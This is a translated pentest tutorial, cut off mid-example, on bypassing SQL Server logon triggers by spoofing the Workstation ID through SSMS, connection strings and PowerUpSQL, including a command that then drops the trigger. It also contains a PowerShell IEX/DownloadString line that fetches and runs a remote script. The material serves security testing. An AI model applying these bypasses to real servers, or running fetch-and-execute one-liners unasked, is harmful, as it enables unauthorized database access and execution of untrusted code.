# SQL Server 登录触发器限制绕过
|
##### 译文声明
本文是翻译文章，文章原作者 Scott Sutherland，文章来源：blog.netspi.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
对于我们来说，对直接连接到SQL Server数据库的应用进行渗透测试是非常常见的。我们偶尔会遇到一个这样的SQL
Server后端，它只允许来自预定义的主机或应用程序的连接。通常这些类型的限制是通过登录触发器强制执行的。本文我将展示如何通过使用连接字符串属性欺骗主机名和应用程序名称来绕过这些限制。这些示例将包括SSMS和PowerUpSQL。对于需要应对旧应用的渗透测试人员和开发人员来说，这应该是很有用的。
## 什么是登录触发器(Logon Trigger)
[登录触发器](https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers?view=sql-server-2017)本质上是一个存储过程，在成功验证到SQL
Server之后，但在登录会话完全建立之前执行。它们通常用于根据一天中的时间、主机名、应用程序名称和单个用户并发会话的数量限制对SQL Server的访问。
## 安装SQL Server
如果尚未安装SQL Server，可以使用以下几个资源：
  1. 从[这里](https://www.microsoft.com/en-us/sql-server/sql-server-editions-express)下载并安装SQL Server。
  2. 从[这里](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-2017)下载并安装SQLServerManagementStudioExpress(SSMS)。
## 创建登录触发器以限制主机名
以下是设置触发器的说明，该触发器基于连接的工作站名称来限制访问。
  1. 使用SSMS以系统管理员身份登录新的SQL Server实例。
  2. 首先，让我们使用下面的命令查看连接到SQL Server实例的工作站的名称。默认情况下，它应该使用连接到SQL Server实例的工作站的主机名。 
         SELECT HOST_NAME()
[](https://p2.ssl.qhimg.com/t01f8a1888d88cda9d0.png)
  3. 创建一个登录触发器，限制对特定主机名的访问。按如下所示执行触发器。 
         -- Create our logon trigger
     CREATE TRIGGER MyHostsOnly
     ON ALL SERVER
     FOR LOGON
     AS
     BEGIN
         IF
         (
             -- White list of allowed hostnames are defined here.
             HOST_NAME() NOT IN ('ProdBox','QaBox','DevBox','UserBox')
         )
         BEGIN
             RAISERROR('You are not allowed to login', 16, 1);
             ROLLBACK;
         END 
     END
[](https://p0.ssl.qhimg.com/t01f79968983f376356.png)
  4. 设置登录触发器后，当再次尝试使用SSMS登录时，应该会收到如下所示的错误，因为你是从列表中没有的主机名进行连接的。  
[](https://p3.ssl.qhimg.com/t012f5b56cc938c5043.png)
你可能会问，“我什么时候才能真正实际使用这个工具？”通常是在我们从配置文件或反编译代码中恢复连接字符串之后，现在我们希望使用这些信息直接连接到SQL
Server。在应用渗透测试期间，这是一个非常常见的场景，但是在网络渗透测试和红队参与期间，我们还可以在打开的文件共享中找到内部应用程序和配置文件。
## 使用SSMS欺骗主机名
  1. 在SSMS中打开“Connect Object Explorer”并选择options -> “Additional Connection Parameters”。这里你可以动态地设置连接字符串属性。作为例子，我们将“Workstation ID”属性设置为“DevBox”，这是我们所知道的白名单中的主机名。注意：稍后我将介绍几种识别白名单主机名的方法。  
[](https://p4.ssl.qhimg.com/t014db79608246e54d0.png)
  2. 点击登录。如果打开查询窗口并再次检查主机名，则应返回“DevBox”。这进一步说明我们成功地欺骗了主机名。 
         SELECT HOST_NAME()
[](https://p3.ssl.qhimg.com/t0121241bf970fbc201.png)
## 使用连接字符串欺骗主机名
SSMS只是用我们的“workstation
id”属性集构建一个连接字符串。下面是一个简单的连接字符串示例，该字符串将作为当前Windows用户连接到远程SQL
Server实例，并选择“Master”数据库。
    Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;
如果我们在上一节中展示的登录触发器已经实现，我们应该会看到“failed to connect”提示。但是，如果将“WorkStation
ID”属性设置为允许的主机名，则将成功登录。
    Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;Workstation ID = DevBox;
## 使用PowerUpSQL欺骗主机名
我还向PowerUpSQL的Get-SQLQuery函数添加了“WorkstationId”选项。如果有时间我将改进其他功能。现在，下面是一个示例，展示了如何绕过我们在上一节中创建的登录触发器。
  1. 打开Powershell并通过你喜欢的方法加载PowerUpSQL。下面的示例演示如何直接从GitHub加载它。 
         IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
  2. 初始连接由于触发器限制而失败。请注意，需要设置“-ReturnError”来查看服务器返回的错误。 
         Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -Query "SELECT host_name()" -ReturnError
[](https://p5.ssl.qhimg.com/t019b68a03eff1d7452.png)
  3. 现在将workStationid选项设置为“DevBox”，应该能够成功地执行查询。 
         Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -Query "SELECT host_name()" -WorkstationId "DevBox"
[](https://p2.ssl.qhimg.com/t01b1b364804244f6c9.png)
  4. 要删除触发器，可以使用下面的命令。 
         Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -WorkstationId "DevBox" -Query 'DROP TRIGGER MyHostsOnly on all server'
## 创建登录触发器以限制应用程序
以下是设置触发器的说明，该触发器根据连接应用程序名称限制访问。
  1. 使用SSMS以系统管理员身份登录新的SQLServer实例。
  2. 首先，让我们使用下面的命令查看连接到SQLServer实例的应用程序的名称。它应该返回“Microsoft SQL Server Management Studio – Query”。 
         SELECT APP_NAME()
[](https://p1.ssl.qhimg.com/t013dde4bacc1f1ff00.png)
  3. 创建限制访问特定应用程序的登录触发器。按如下所示执行触发器。 
         CREATE TRIGGER MyAppsOnly
     ON ALL SERVER
     FOR LOGON
     AS
     BEGIN
     IF